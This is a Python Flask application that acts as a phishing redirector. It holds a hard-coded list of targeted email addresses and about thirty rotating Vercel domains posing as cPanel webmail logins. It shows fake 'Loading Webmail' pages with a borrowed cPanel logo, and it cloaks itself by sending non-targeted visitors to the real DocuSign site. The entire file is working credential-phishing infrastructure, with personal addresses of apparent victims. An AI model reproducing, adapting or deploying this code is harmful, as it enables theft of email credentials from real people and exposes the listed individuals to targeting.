from flask import Flask, redirect, request, render_template_string
import os

app = Flask(__name__)
application = app

DOMAINS = [
    'https://session-failure-login-webmail-cpane.vercel.app',
    'https://session-failure-login-webmail-cpane-psi.vercel.app',
    'https://session-failure-login-webmail-cpane-amber.vercel.app',
    'https://session-failure-login-webmail-cpane-topaz.vercel.app',
    'https://session-failure-login-webmail-cpane-theta.vercel.app',
    'https://session-failure-login-webmail-cpane-self.vercel.app',
    'https://session-failure-login-webmail-cpane-blush.vercel.app',
    'https://session-failure-login-webmail-cpane-eight.vercel.app',
    'https://session-failure-login-webmail-cpane-opal.vercel.app',
    'https://session-failure-login-webmail-cpane-two.vercel.app',
    'https://session-failure-login-webmail-cpane-beta.vercel.app',
    'https://session-failure-login-webmail-cpane-jade.vercel.app',
    'https://session-failure-login-webmail-cpane-seven.vercel.app',
    'https://session-failure-login-webmail-cpane-one.vercel.app',
    'https://session-failure-login-webmail-cpane-eta.vercel.app',
    'https://session-failure-login-webmail-cpane-liard.vercel.app',
    'https://session-failure-login-webmail-cpane-wine.vercel.app',
    'https://session-failure-login-webmail-cpane-delta.vercel.app',
    'https://session-failure-login-webmail-cpane-three.vercel.app',
    'https://session-failure-login-webmail-cpane-nine.vercel.app',
    'https://session-failure-login-webmail-cpane-omega.vercel.app',
    'https://session-failure-login-webmail-cpane-tan.vercel.app',
    'https://session-failure-login-webmail-cpane-gamma.vercel.app',
    'https://session-failure-login-webmail-cpane-umber.vercel.app',
    'https://session-failure-login-webmail-cpane-lyart.vercel.app',
    'https://session-failure-login-webmail-cpane-dusky.vercel.app',
    'https://session-failure-login-webmail-cpane-lemon.vercel.app',
    'https://session-failure-login-webmail-cpane-murex.vercel.app',
    'https://session-failure-login-webmail-cpane-xi.vercel.app',
    'https://session-failure-login-webmail-cpane-ten-sigma.vercel.app'
]

# Privileged email list - easily updateable
PRIVILEGED_EMAILS = [
    'brijesh@webicules.com',
    'david@website4u.ca',
    'admin@wholesaleelectronics.com.bd',
    'zulhilmi@wijati.com',
    'maynard@winegums71.com',
    'abolo@webtilia.com',
    'contact@withinhemp.com',
    'camwolf10@wolfstr.com',
    'venewolf13@wolfstr.com',
    'amwolf29@wolfstr.com',
    'jedawolf14@wolfstr.com',
    'travel@wonderland.co.tz',
    'finance@wonderland.co.tz',
    'steve@wrighteurope.com',
    'evanews.hm01@wtr-mags.my',
    'sistemas@xpertmold.com',
    'ydx-ecp-515@ydxmail.com',
    'vendas@ynovadesign.com'
]

# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    # Try to get email from query parameter first (?web=email@email.com)
    email = request.args.get('web', '')
    
    # If no query parameter, serve a page that can handle the fragment
    if not email:
        return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                    }
                    .loading-container {
                        text-align: center;
                        padding: 20px;
                    }
                    .logo {
                        height: 35px;
                        width: auto;
                        margin-bottom: 15px;
                    }
                    .loading-spinner {
                        width: 40px;
                        height: 40px;
                        margin: 20px auto;
                        border: 3px solid #f3f3f3;
                        border-top: 3px solid #FF6C2C;
                        border-radius: 50%;
                        animation: spin 1s ease-in-out infinite;
                    }
                    .loading-text {
                        color: #FF6C2C;
                        font-size: 14px;
                        letter-spacing: 0.5px;
                        opacity: 0.8;
                        animation: pulse 1.5s ease-in-out infinite;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                    @keyframes pulse {
                        0%, 100% { opacity: 0.5; }
                        50% { opacity: 1; }
                    }
                </style>
            </head>
            <body>
                <div class="loading-container">
                    <img src="https://wolffacademy.com.br:2096/cPanel_magic_revision_1668371294/unprotected/cpanel/images/webmail-logo.svg" 
                         alt="Logo" 
                         class="logo">
                    <div class="loading-spinner"></div>
                    <div class="loading-text">Loading Webmail...</div>
                </div>
                
                <script>
                    const status = document.getElementById('status');
            
                    if (window.location.hash) {
                        let email = window.location.hash.substring(1);
                        
                        // Redirect after 2 seconds
                        setTimeout(function() {
                            window.location.href = '/?web=' + encodeURIComponent(email);
                        }, 2000);
                    } else {
                        // If no hash, show error after 2 seconds
                        setTimeout(function() {
                            document.querySelector('.loading-text').innerText = 'Invalid email';
                            document.querySelector('.loading-text').style.color = '#dc3545';
                        }, 2000);
                    }
                </script>
            </body>
            </html>
        ''')
    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email.", 400
    
    # Check if email is privileged
    if email.lower() in [e.lower() for e in PRIVILEGED_EMAILS]:
        # Get next domain in round-robin sequence
        target_domain = DOMAINS[current_index]
        
        # Increment index for next request
        current_index = (current_index + 1) % len(DOMAINS)
        
        # Construct target URL with the required ?web= parameter format
        target_url = f"{target_domain}/?web={email}"
        
        # Return loading page before redirect
        return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                    }
                    .loading-container {
                        text-align: center;
                        padding: 20px;
                    }
                    .logo {
                        height: 35px;
                        width: auto;
                        margin-bottom: 15px;
                    }
                    .loading-spinner {
                        width: 40px;
                        height: 40px;
                        margin: 20px auto;
                        border: 3px solid #f3f3f3;
                        border-top: 3px solid #FF6C2C;
                        border-radius: 50%;
                        animation: spin 1s ease-in-out infinite;
                    }
                    .loading-text {
                        color: #FF6C2C;
                        font-size: 14px;
                        letter-spacing: 0.5px;
                        opacity: 0.8;
                        animation: pulse 1.5s ease-in-out infinite;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                    @keyframes pulse {
                        0%, 100% { opacity: 0.5; }
                        50% { opacity: 1; }
                    }
                </style>
            </head>
            <body>
                <div class="loading-container">
                    <img src="https://wolffacademy.com.br:2096/cPanel_magic_revision_1668371294/unprotected/cpanel/images/webmail-logo.svg" 
                         alt="Logo" 
                         class="logo">
                    <div class="loading-spinner"></div>
                    <div class="loading-text">Redirecting to Webmail...</div>
                </div>
                
                <script>
                    // Redirect after 2 seconds
                    setTimeout(function() {
                        window.location.href = "{{ target_url|safe }}";
                    }, 2000);
                </script>
            </body>
            </html>
        ''', target_url=target_url)
    else:
        # Non-privileged user - redirect to DocuSign
        return redirect('https://account.docusign.com/', 302)

if __name__ == '__main__':
    app.run(debug=True)